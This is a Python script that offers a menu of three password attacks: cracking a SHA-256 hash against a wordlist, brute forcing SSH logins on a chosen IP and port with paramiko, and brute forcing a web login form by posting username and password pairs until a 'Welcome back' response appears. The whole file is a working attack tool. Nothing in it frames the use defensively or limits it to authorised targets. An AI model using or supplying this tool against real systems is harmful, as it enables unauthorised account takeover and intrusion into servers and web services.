import hashlib
import sys
import os
import time
import paramiko
import termcolor
import requests

def get_file_contents(file_path):
    with open(file_path, "r", encoding='ISO-8859-1') as file:
        return [line.strip() for line in file]

def option1():
    wanted_hash = input("Enter the sha256 hash: ")
    password_file = input("Enter the path to the word list file: ")
    password_list = get_file_contents(password_file)
    attempts = 0

    for password in password_list:
        password = password.strip("\n").encode('ISO-8859-1')
        password_hash = hashlib.sha256(password).hexdigest()
        if password_hash == wanted_hash:
            print("\033[32m{}\033[0m".format(password.decode('ISO-8859-1')))
            exit()
        attempts += 1
    print("Password hash not found!")

def option2():
    user_list = input("\n[*] Enter Path Of Users List:- ")
    pass_list = input("\n[*] Enter Path Of Password List:- ")
    host = input("\n[*] Enter target ip:- ")
    port = int(input("\n[*] Enter port:- "))
    print('\n')
    print("[+] BruteForce Started....")
    print('\n')
    
    usr_arr = get_file_contents(user_list)
    pass_arr = get_file_contents(pass_list)
    
    i = 1
    x = 0
    u = 0
    while i == 1:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            print("[*] Username:", str(usr_arr[u]), "| [*] Password:", str(pass_arr[x]))
            client.connect(username=usr_arr[u], hostname=host, password=pass_arr[x], port=port)
            print("[✔] Valid Credentials Found\n")
            break
        except (paramiko.ssh_exception.AuthenticationException):
            print("[X] Password Not Found!\n")
            time.sleep(0.2)
            if x == len(pass_arr) - 1:
                x = 0
                if u == len(usr_arr) - 1:
                    break
                u += 1
            else:
                x += 1
            continue

def option3():
    target = input("Enter the login address: ")
    usernames = input("Enter the location of the usernames word list file: ")
    passwords = input("Enter the location of the passwords word list file: ")
    needle = "Welcome back"

    username_list = get_file_contents(usernames)
    password_list = get_file_contents(passwords)

    for username in username_list:
        for password in password_list:
            print("[X] Attempting user:password -> {}:{}".format(username, password))
            r = requests.post(target, data={"username": username, "password": password})
            if needle in r.content.decode():
                print("[>>>>>] Valid password '{}' found for user '{}'!".format(password, username))
                sys.exit()

    print("No password found for '{}'!".format(username))


def main():
    print("1. SHA 256 Cracking")
    print("2. SSH Brute Forcing")
    print("3. Web Login Brute Forcing")

    choice = int(input("Enter your choice: "))

    if choice == 1:
        option1()
    elif choice == 2:
        option2()
    elif choice == 3:
        option3()
    else:
        print("Invalid Choice, try again")

if __name__ == '__main__':
    main()